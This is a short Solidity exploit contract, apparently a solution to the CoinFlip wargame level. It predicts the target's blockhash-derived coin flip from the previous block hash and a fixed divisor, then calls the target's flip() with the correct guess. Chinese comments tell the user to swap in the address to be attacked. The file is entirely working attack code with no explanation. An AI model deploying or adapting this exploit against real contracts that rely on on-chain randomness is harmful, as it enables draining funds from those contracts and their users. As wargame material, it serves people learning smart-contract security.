// SPDX-License-Identifier: MIT
  pragma solidity ^0.6.0;

  import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
  interface CoinFlip{
    function flip(bool _guess) external returns (bool);//这里函数可见性要改成external
  }

  contract attack {

    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address targetAddress =0xC41Df4bb2f8B05AcF488EEB5Bdee40F547C6d29F;//改成要攻击地址
    CoinFlip c;

    function exp() public returns (bool) {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));

      if (lastHash == blockValue) {
        revert();
      }

      lastHash = blockValue;
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;
      c = CoinFlip(targetAddress);
      c.flip(side);
    }
  }